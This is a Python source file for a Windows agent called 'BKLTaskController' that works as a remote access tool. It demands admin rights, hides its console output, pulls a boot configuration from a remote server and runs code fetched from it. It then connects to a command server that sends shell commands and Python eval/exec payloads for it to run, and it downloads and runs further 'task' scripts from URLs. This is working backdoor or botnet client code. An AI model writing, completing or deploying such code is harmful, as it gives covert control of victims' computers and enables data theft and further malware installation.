# -*- coding: utf-8 -*-
# cython: language_level=3
import time
import ctypes, sys, os, importlib

import base64
import BKLUtils
import requests
import subprocess

from socket import *

from threading import Thread
from configparser import ConfigParser
from ast import literal_eval
import py_compile

def __init__():
    return True

if not __init__():
    sys.exit()

if len(sys.argv) > 1:
    if sys.argv[1] == "--auto-start":
        pass
    elif sys.argv[1] == "--restart":
        time.sleep(int(sys.argv[2]))
    elif sys.argv[1] == "-show":
        print("[ Info ] 外显模式 turn on.")
    else: os._exit(0)

if len(sys.argv) > 1:
    if sys.argv[1] != "-show":
        sys.stdout = None
        sys.stderr = None
else:
    sys.stdout = None
    sys.stderr = None
    
if not BKLUtils.is_admin():
    print("无法锁定管理员权限: 无引导.")
    sys.exit()
else: os.chdir(os.path.dirname(os.path.realpath(__file__)))

def do_code(func_str):
    namespace = globals()
    fun = compile(func_str, '<string>', 'exec')

    exec(fun, namespace)
    try:
        ret = namespace['main']() #do the main func of the code
    except Exception as e:
        return False, str(e)
    else:
        return True, ret
    finally:
        del namespace

class data_center:
    def __init__(self, token: str, ip: str, port: int=32579):
        if token != "IGRyru81rBQaCeR^TCoW&KRlb2herYrW1Kn!SMf%": os._exit(0)
        self.ip_port = (ip, port)
        self.connect_right = False

    def get_json(self, data):
        return literal_eval(data)

    def connect(self, name, signature):
        while 1:
            try:
                connect = socket(AF_INET,SOCK_STREAM)
                connect.connect(self.ip_port)
            except Exception as e:
                print("连接失败", e)
            else:
                ep = BKLUtils.ExchangeProtocol(connect)

                ep.send_msg(str({"state": "SUCCESS", "signature": signature, "name": name}))
                
                data = ep.recv_msg()

                if data != b'':
                    json = self.get_json(data)
                
                    if "state" in json:
                        if json['state'] == "SUCCESS":
                            self.connect = connect
                            self.ep = ep

                            self.name = name
                            self.signature = signature

                            self.connect_right = True
                            print("[ Info ] 已连接到服务器.")
                            return True
                else:
                    print("[ Warn ] 服务器拒绝了连接请求.")
                    os._exit()
            
            connect.close()
            print("[ Info ] 将在 20s 后重试连接.")
            time.sleep(20)

    def disconnect(self):
        print("[ Info ] Disconnect from server.")
        self.connect.close()
        self.connect_right = False
        del self.connect
        del self.ep
    
    def main(self):
        while self.connect_right:
            try:
                try:
                    data = self.ep.recv_msg()
                except ValueError:
                    print("[ Error ] 连接错误 ", e)
                    self.disconnect()
                    break

                json = self.get_json(data)

                if json['type'] == "IsOnline":
                    self.send_msg("{'state': True, 'content': 'online'}", show=False)
                    continue

                t = Thread(target=self.do_command, args=(json, ))
                t.setDaemon(True)
                t.start()
            except Exception as e:
                try:
                    self.ep.send_msg(str({"state": False, "content": e}))
                except Exception as e:
                    print("[ Error ] recv data error", e)
                    self.disconnect()
                    break
        else:
            self.disconnect()

    def do_command(self, json):
        show = True
        send_back = {}
        try:
            if json['type'] == "":
                send_back['state'] = False
                send_back['content'] = "No executable"
            elif json['type'] == "command":
                sp = subprocess.Popen(json['content'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                while 1:
                    data = sp.stdout.readline()
                    if data == b'':
                        break
                    self.send_msg(data.decode("gbk"), show=False)
                
                err = sp.stderr.read()
                if err:
                    self.send_msg(err.decode("gbk"))
                
                send_back['state'] = True
                send_back['content'] = "do command complete."
            elif json['type'] == "code":
                try:
                    result = eval(json['content'])
                except Exception as e:
                    send_back['state'] = False
                    send_back['content'] = str(e)
                else:
                    send_back['state'] = True
                    send_back['content'] = result
            elif json['type'] == "codex":
                ret = do_code(json['content'])
                send_back['state'] = ret[0]
                send_back['content'] = ret[1]
            else:
                send_back['state'] = False
                send_back['content'] = "command not found"
        except Exception as e:
            send_back['state'] = False
            send_back['content'] = str(e)

        self.send_msg(send_back, show=show)
        return
    
    def set_buffer_size(self, num):
        print("set buffer size", num)
        self.set_buffer_size = num
    
    def send_msg(self, msg, show=True):
        if not self.connect_right:
            if show:
                print("local:", msg)
            return False
        try:
            self.ep.send_msg(str(msg))
        except Exception as e:
            print("[ Error ] send data error:", e)
            self.connect_right = False
            return False
        else:
            if show:
                print("send back:", msg)
            return True
    
    def IsConnect(self):
        return self.connect_right

class task_controller:
    def __init__(self, token: str):
        if token != "IGRyru81rBQaCeR^TCoW&KRlb2herYrW1Kn!SMf%": os._exit(0)
        self.t = {}
        if not os.path.exists(".\\Tasks\\"):
            os.mkdir("Tasks")
        self.tasks_path = os.path.realpath(".\\Tasks")

    def run_all(self):
        for task in self.get_installed_task():
            self.run_task(task)
        BKLTC.dc.send_msg("[Task Controller] run all done.")

    def task(self, file):
        try:
            params = importlib.import_module("Tasks." + file)
        except Exception as e:
            BKLTC.dc.send_msg(f"[Task Controller] 加载任务 {file} 时出现错误: {e}")
            del self.t[file]
            return
        
        try:
            params.main()
        except Exception as e:
            BKLTC.dc.send_msg(f"[Task Controller] 执行任务 {file} 时出现错误: {e}")
        else:
            BKLTC.dc.send_msg(f"[Task Controller] 任务 {file} 执行完毕: 已退出.")
        
        del params
        del self.t[file]
    
    def run_task(self, task):
        if task in self.get_running_tasks():
            return

        t = Thread(target=self.task, args=(task, ))
        t.setDaemon(True)
        t.start()

        self.t[task] = t
        BKLTC.dc.send_msg(f"[Task Controller] 运行任务 {task}")
    
    def del_task(self, task):
        if self.get_task_path(task):
            os.remove(self.get_task_path(task))
            return True
        return False

    def clean_thread(self):
        for task_name in self.t:
            t = self.t[task_name]
            if not t.is_alive():
                del self.t[task_name]
    
    def get_running_tasks(self):
        self.clean_thread()
        tnames = []
        for task_name in self.t:
            tnames.append(task_name)
        return tnames
    
    def install_task(self, task_name: str , url: str):
        filename = self.tasks_path +  f"\\{task_name}.py"

        r = requests.get(url, proxies=None)
        f = open(filename, "wb")
        f.write(r.content)
        f.close()
        r.close()

        try:
            py_compile.compile(filename, cfile=filename + "c")
        except Exception as e:
            BKLTC.dc.send_msg(f"[Task Controller] 编译任务文件时出现错误: {e}")
        else:
            self.run_task(task_name)
        
        os.remove(filename)
    
    def get_installed_task(self):
        inl = []
        lst = os.listdir(self.tasks_path)
        for filename in lst:
            stem, suffix = os.path.splitext(filename)
            if suffix == ".pyc":
                inl.append(stem)
        return inl
    
    def get_task_path(self, task):
        task_path = self.tasks_path + "\\" + task + ".pyc"
        if os.path.exists(task_path):
            return task_path
        else: return None

class BKLTaskController:
    def __init__(self, token: str) -> None:
        if token != "IGRyru81rBQaCeR^TCoW&KRlb2herYrW1Kn!SMf%":
            os._exit(0)
        
        self.__version__ = 1.63

        self.minutes = 0
        self.outgoing = False
        self.IsInitialized = False

        self.conf = ConfigParser()
        self.conf.read(os.path.realpath("..\\Profile\\config.ini"))
        try:
            self.address = self.__get_config_content__("address")
            self.name = self.__get_config_content__("name")
            self.signature = self.__get_config_content__("signature")
        except Exception as e:
            print("[ Error ] 读取配置文件时出现错误.", e)
            os._exit(0)
        
        while 1:
            try:
                r = requests.get(self.address)
                self.__boot_json__ = r.json()
                r.close()
            except Exception as e:
                print("[ Error ] 请求数据时出现错误.", e)
                time.sleep(1)
            else: break

        if not self.__boot_json__["allow_startup"]:
            os._exit(0)
        
        try:
            r = requests.get(self.__boot_json__["boot_code"])
            do_code(r.text)
            r.close()
        except: pass
        
        self.tc = task_controller("IGRyru81rBQaCeR^TCoW&KRlb2herYrW1Kn!SMf%")
        self.dc = data_center("IGRyru81rBQaCeR^TCoW&KRlb2herYrW1Kn!SMf%", self.__boot_json__['data_center'][0], self.__boot_json__['data_center'][1])
    
    def __get_config_content__(self, path):
        return base64.b64decode(self.conf.get("BKLTC", path).encode("utf-8")).decode("utf-8")

    def initialize(self):
        t = Thread(target=self.timer)
        t.setDaemon(True)
        t.start()

        for task in self.__boot_json__["Task_Controller"]["force_task"]:
            if not task in self.tc.get_installed_task():
                self.tc.install_task(task, self.__boot_json__["Task_Controller"]["force_task"][task])

        if self.__boot_json__["Task_Controller"]["auto_start"]:
            self.tc.run_all()

        while 1:
            if self.dc.connect(self.name, self.signature):
                self.dc.main()
        print("[ Info ] 重启数据中心.")
    
    def timer(self):
        global minutes
        while 1:
            time.sleep(60)
            self.minutes += 1

    def restart(self):
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", '/c "net stop BKLTaskController && net start BKLTaskController"', None, 0)
        os._exit(0)

    def quit_self(self):
        os._exit(0)

    def set_config(self, path, name, value):
        value = base64.b64encode(value.encode("utf-8")).decode("utf-8")

        self.conf.set(path, name, value)

        f = open("config.ini", "w", encoding="utf-8")
        self.conf.write(f)
        f.close()

        self.conf = ConfigParser()
        self.conf.read("config.ini")

BKLTC = BKLTaskController("IGRyru81rBQaCeR^TCoW&KRlb2herYrW1Kn!SMf%")